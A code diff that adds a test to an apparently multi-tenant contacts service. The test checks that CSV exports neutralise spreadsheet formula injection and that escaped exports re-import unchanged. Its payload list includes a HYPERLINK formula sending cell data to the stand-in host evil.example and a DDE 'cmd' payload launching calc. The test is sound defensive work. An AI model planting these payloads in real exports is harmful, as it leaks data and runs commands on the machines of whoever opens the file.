@@ -331,6 +331,32 @@ def test_contacts_export_round_trips_through_import(tenant):
     assert any(c["email"] == "imported_one@example.com" for c in tenant.get("/contacts"))
 
 
+def test_an_export_cannot_carry_a_formula_into_a_spreadsheet(tenant):
+    """Any member can type a formula into a field; whoever opens the export would run it."""
+    hostile = ['=HYPERLINK("https://evil.example/?d="&A1,"Click")', "+cmd|' /C calc'!A0",
+               "-2+3", "@SUM(1+1)"]
+    payload = "name,email,title\n" + "".join(
+        f'"{n.replace(chr(34), chr(34) * 2)}",formula_{i}@example.com,Buyer\n'
+        for i, n in enumerate(hostile))
+    result = tenant.post("/import/contacts", {"csv": payload, "on_duplicate": "skip"})
+    assert result["created"] == len(hostile)
+    stored = {c["email"]: c["name"] for c in tenant.get("/contacts?limit=200")}
+    assert [stored[f"formula_{i}@example.com"] for i in range(len(hostile))] == hostile
+
+    exported = tenant.raw("GET", "/export/contacts").text
+    names = {row["email"]: row["name"] for row in csv.DictReader(io.StringIO(exported))}
+    for i, name in enumerate(hostile):
+        assert names[f"formula_{i}@example.com"] == "'" + name
+
+    # The escaped export re-imports as the original text, not with a stray quote.
+    reimport = "name,email\n" + "".join(
+        f'"{names[f"formula_{i}@example.com"].replace(chr(34), chr(34) * 2)}",'
+        f"again_{i}@example.com\n" for i in range(len(hostile)))
+    tenant.post("/import/contacts", {"csv": reimport, "on_duplicate": "skip"})
+    again = {c["email"]: c["name"] for c in tenant.get("/contacts?limit=200")}
+    assert [again[f"again_{i}@example.com"] for i in range(len(hostile))] == hostile
+
+
 def test_import_reports_bad_rows_instead_of_silently_dropping_them(tenant):
     payload = ("name,email\n"
                ",no_name@example.com\n"
